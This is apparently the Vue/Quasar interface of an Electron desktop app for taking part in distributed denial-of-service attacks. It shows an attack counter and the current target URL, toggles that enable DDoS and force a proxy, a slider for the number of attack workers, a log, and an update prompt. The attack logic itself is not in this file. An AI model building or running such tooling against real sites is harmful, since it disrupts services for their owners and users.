<template>
  <q-page class="row items-center justify-evenly bg-grey-10 text-white">
    <q-card class="bg-grey-10 full-card">
      <q-card-section>
        <div class="text-h4 text-center">{{ $t('ddos.counter.attackedTimes') }}</div>
        <div class="text-h1 text-center">{{ attackCounter }}</div>
        <div class="text-h5 text-center">{{ $t('ddos.counter.currentTarget') }}</div>
        <div class="text-h5 text-center">{{ currentAttack }}</div>
      </q-card-section>
      <q-card-section>
        <div class="text-subtitle2 text-grey-7">{{ $t('ddos.description') }}</div>
      </q-card-section>
      <q-card-section>
        <LanguageSelect />
      </q-card-section>
      <q-card-section>
        <q-list>
          <q-item tag="label" v-ripple>
            <q-item-section>
              <q-item-label>{{ $t('ddos.enable.name') }}</q-item-label>
              <q-item-label caption class="text-grey-7">{{ $t('ddos.enable.description') }}</q-item-label>
            </q-item-section>
            <q-item-section avatar>
              <q-toggle color="green" v-model="ddosEnabled" val="friend" />
            </q-item-section>
          </q-item>

          <q-item tag="label" v-ripple>
            <q-item-section>
              <q-item-label>{{ $t('ddos.proxy.name') }}</q-item-label>
              <q-item-label caption class="text-grey-7">{{ $t('ddos.proxy.description') }}</q-item-label>
            </q-item-section>
            <q-item-section avatar>
              <q-toggle color="blue" v-model="forceProxy" val="picture" />
            </q-item-section>
          </q-item>
        </q-list>
      </q-card-section>
      <q-card-section>
        <q-scroll-area style="height: 200px;">
          <div v-for="n in log.length" :key="n" class="">
            {{ log[n] }}
          </div>
        </q-scroll-area>
      </q-card-section>
      <q-card-section>
        <div class="text-subtitle2 text-grey-7">{{ $t('ddos.coordinators') }}</div>
      </q-card-section>
    </q-card>

    <q-page-sticky position="bottom-right" :offset="[18, 18]">
      <q-btn fab icon="settings" color="grey-9" @click="advancedSettingsDialog = true"/>
    </q-page-sticky>

    <q-dialog v-model="advancedSettingsDialog">
      <q-card>
        <q-card-section>
          <div class="text-h6">{{ $t('ddos.advanced.header') }}</div>
          <q-item-label caption class="text-grey-7">{{ $t('ddos.advanced.description') }}</q-item-label>
        </q-card-section>

        <q-card-section class="q-pt-none">
          <div class="text-h7">{{ $t('ddos.advanced.masDosersCount.name') }}</div>
          <q-slider
            v-model="maxDosersCount"
            :min="16"
            :max="maxNumberOfWorkers"
            :step="16"
            color="light-green"
          />
          <div class="custom-max-dosers-count-wrapper">
            <q-input
              :model-value="maxDosersCount"
              type="number"
              :min="1"
              filled
              square
              required
              @update:modelValue="updateNumberOfWorkers"
            />
          </div>
          <q-item-label caption class="text-grey-7">{{ $t('ddos.advanced.masDosersCount.description') }}</q-item-label>
        </q-card-section>

        <q-card-actions align="right">
          <q-btn flat label="OK" color="primary" class="fit" v-close-popup />
        </q-card-actions>
      </q-card>
    </q-dialog>

    <!--    Update dialog-->
    <q-dialog v-model="updateDialog" persistent>
      <q-card>
        <q-toolbar>
          <q-avatar>
            <img src="https://cdn.quasar.dev/logo-v2/svg/logo.svg">
          </q-avatar>

          <q-toolbar-title>{{ $t('ddos.update.title') }}</q-toolbar-title>

          <q-btn flat round dense icon="close" v-close-popup />
        </q-toolbar>

        <q-card-section>
          {{ updateMessage }}
        </q-card-section>

        <q-card-actions align="right">
          <q-btn flat :label="$t('ddos.update.cancel')" color="primary" v-close-popup />
          <q-btn flat :label="$t('ddos.update.confirm')" color="primary" v-close-popup @click="confirmInstallUpdate"/>
        </q-card-actions>
      </q-card>
    </q-dialog>
  </q-page>
</template>

<script lang="ts">
import { defineComponent, ref } from 'vue'
import LanguageSelect from '../components/LanguageSelect.vue'
// import { ipcRenderer, IpcRendererEvent } from 'electron'

export default defineComponent({
  name: 'PageIndex',

  components: { LanguageSelect },

  computed: {
    maxNumberOfWorkers (): number {
      return Math.max(this.maxDosersCount, 256)
    }
  },

  methods: {
    updateNumberOfWorkers (numberOfWorkers: number | undefined) {
      // When entering via input form it can be undefined
      if (numberOfWorkers !== undefined) {
        this.maxDosersCount = numberOfWorkers
      }
    },

    serveAttack (_event: unknown, data: { url: string, log: string }) {
      if ((new Date()).getTime() - this.lastAttackChange.getTime() > 1000) {
        this.currentAttack = data.url
        this.lastAttackChange = new Date()
      }
      this.attackCounter += 1
      if (this.log.length > 100) this.log.pop()
      this.log.unshift(data.log)
    },

    askForInstallUpdate (_event: unknown, data: { message: string }) {
      this.updateDialog = true
      this.updateMessage = data.message
    },

    confirmInstallUpdate () {
      window.require('electron').ipcRenderer.send('installUpdate')
    }
  },

  watch: {
    ddosEnabled (newVal: boolean) {
      window.require('electron').ipcRenderer.send('updateDDOSEnable', { newVal })
    },
    forceProxy (newVal: boolean) {
      window.require('electron').ipcRenderer.send('updateForceProxy', { newVal })
    },
    maxDosersCount (newVal: number | undefined) {
      if (newVal !== undefined) {
        window.require('electron').ipcRenderer.send('updateMaxDosersCount', { newVal })
      }
    }
  },

  mounted () {
    window.require('electron').ipcRenderer.on('atack', this.serveAttack.bind(this))

    window.require('electron').ipcRenderer.on('update', this.askForInstallUpdate.bind(this))
  },

  setup () {
    const ddosEnabled = ref(true)
    const forceProxy = ref(true)
    const attackCounter = ref(0)
    const currentAttack = ref('')
    const lastAttackChange = ref(new Date())
    const log = ref([] as Array<string>)

    const advancedSettingsDialog = ref(false)
    const maxDosersCount = ref(32)
    const updateDialog = ref(false)
    const updateMessage = ref('message')

    return { ddosEnabled, forceProxy, attackCounter, currentAttack, lastAttackChange, log, advancedSettingsDialog, maxDosersCount, updateDialog, updateMessage }
  }
})
</script>

<style lang="sass" scoped>
.full-card
  width: 80%
  max-width: 700px
</style>
